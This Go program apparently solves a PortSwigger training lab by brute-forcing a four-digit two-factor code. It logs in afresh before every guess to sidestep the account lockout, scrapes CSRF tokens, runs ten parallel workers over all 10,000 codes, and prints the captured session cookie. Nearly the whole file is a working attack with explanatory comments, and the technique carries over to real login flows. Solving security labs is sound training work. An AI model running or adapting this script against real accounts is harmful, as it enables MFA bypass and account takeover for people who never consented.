// solve.go
// Run -> go run solve.go <lab-url>
//
// Purpose: brute-force a 4-digit 2FA code on PortSwigger's
// "2FA bypass using a brute-force attack" lab.
//
// The tricky part of this lab is that entering the wrong 2FA code twice
// locks/logs out the account. So we can't just spam /login2 with every
// possible code on one session.
//
// The fix: give every single guess its own completely fresh login session.
// That means before each guess we do the full login flow again:
//   1. GET  /login    -> load login page, grab CSRF token
//   2. POST /login    -> submit username + password, get a valid session
//   3. GET  /login2   -> load the 2FA page, grab a fresh CSRF token
//   4. POST /login2   -> submit ONE guessed code on that fresh session
//
// Since each session only ever makes one 2FA attempt, the "2 wrong
// attempts = lockout" rule never fires.
//
// This is the same idea as a Burp "session handling macro" - we're just
// doing it ourselves in code, which is faster and more reliable.

package main

import (
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"os"
	"regexp"
	"strings"
	"sync"
)

const (
	username = "carlos"
	password = "montoya" // Carlos's known password for this lab
	workers  = 10        // how many guesses to run in parallel (start low, raise if stable)
)

var baseURL string

// The login and 2FA pages embed a CSRF token in a hidden input like:
// <input type="hidden" name="csrf" value="abc123">
// We need to scrape this value out and send it back with each form submission,
// or the server will reject the request.
var csrfRegex = regexp.MustCompile(`name="csrf" value="([^"]+)"`)

func getCSRF(body string) string {
	m := csrfRegex.FindStringSubmatch(body)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}

// tryCode performs one full "fresh login, then guess this code" cycle.
// It returns (true, sessionCookie) if this code was correct.
func tryCode(code string) (bool, string) {
	// A fresh cookiejar = a fresh, empty session, just like opening a new
	// private/incognito browser window for every attempt.
	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: jar,
		// Don't auto-follow redirects - we want to SEE the 302 ourselves,
		// since that's exactly the signal we're looking for.
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// --- Step 1: GET /login (load the login page, get CSRF token #1) ---
	r1, err := client.Get(baseURL + "/login")
	if err != nil {
		return false, ""
	}
	b1, _ := io.ReadAll(r1.Body)
	r1.Body.Close()
	csrf1 := getCSRF(string(b1))

	// --- Step 2: POST /login (submit username + password) ---
	form1 := strings.NewReader(fmt.Sprintf(
		"csrf=%s&username=%s&password=%s", csrf1, username, password,
	))
	req2, _ := http.NewRequest("POST", baseURL+"/login", form1)
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	r2, err := client.Do(req2)
	if err != nil {
		return false, ""
	}
	io.Copy(io.Discard, r2.Body) // drain body so the connection can be reused
	r2.Body.Close()

	// --- Step 3: GET /login2 (load the 2FA page, get CSRF token #2) ---
	r3, err := client.Get(baseURL + "/login2")
	if err != nil {
		return false, ""
	}
	b3, _ := io.ReadAll(r3.Body)
	r3.Body.Close()
	csrf2 := getCSRF(string(b3))

	// --- Step 4: POST /login2 (submit our ONE guessed 2FA code) ---
	form2 := strings.NewReader(fmt.Sprintf("csrf=%s&mfa-code=%s", csrf2, code))
	req4, _ := http.NewRequest("POST", baseURL+"/login2", form2)
	req4.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	r4, err := client.Do(req4)
	if err != nil {
		return false, ""
	}
	io.Copy(io.Discard, r4.Body)
	r4.Body.Close()

	// A correct code makes the server respond with:
	//   302 Found
	//   Location: /my-account
	// That's the exact signal we're hunting for.
	if r4.StatusCode == 302 && strings.Contains(r4.Header.Get("Location"), "my-account") {
		cookies := jar.Cookies(r4.Request.URL)
		var sessionVal string
		for _, c := range cookies {
			if c.Name == "session" {
				sessionVal = c.Value
			}
		}
		return true, sessionVal
	}

	return false, ""
}

func main() {
	if len(os.Args) != 2 {
		fmt.Fprintln(os.Stderr, "Usage: go run solve.go <lab-url>")
		os.Exit(1)
	}
	baseURL = strings.TrimRight(os.Args[1], "/")

	// A channel acts as a shared work queue: every worker goroutine pulls
	// the next untried code from it until it's empty.
	codes := make(chan string, 10000)
	for i := 0; i < 10000; i++ {
		codes <- fmt.Sprintf("%04d", i) // format as 0000, 0001, ... 9999
	}
	close(codes)

	var wg sync.WaitGroup
	found := false
	var mu sync.Mutex // protects the shared "found" flag from race conditions

	// Launch N worker goroutines that all pull from the same queue.
	// This is what makes it fast - multiple guesses run at the same time,
	// each with its own independent fresh session.
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			for code := range codes {
				// Stop picking up new work once another worker has already found it.
				mu.Lock()
				if found {
					mu.Unlock()
					return
				}
				mu.Unlock()

				ok, session := tryCode(code)
				fmt.Printf("[worker %d] trying %s\n", workerID, code)

				if ok {
					mu.Lock()
					if !found {
						found = true
						fmt.Printf("\n[+] FOUND! Correct MFA code: %s\n", code)
						fmt.Printf("[+] Session cookie: %s\n", session)
					}
					mu.Unlock()
					return
				}
			}
		}(w)
	}

	wg.Wait()
	if !found {
		fmt.Println("[-] No correct code found in range 0000-9999")
	}
}
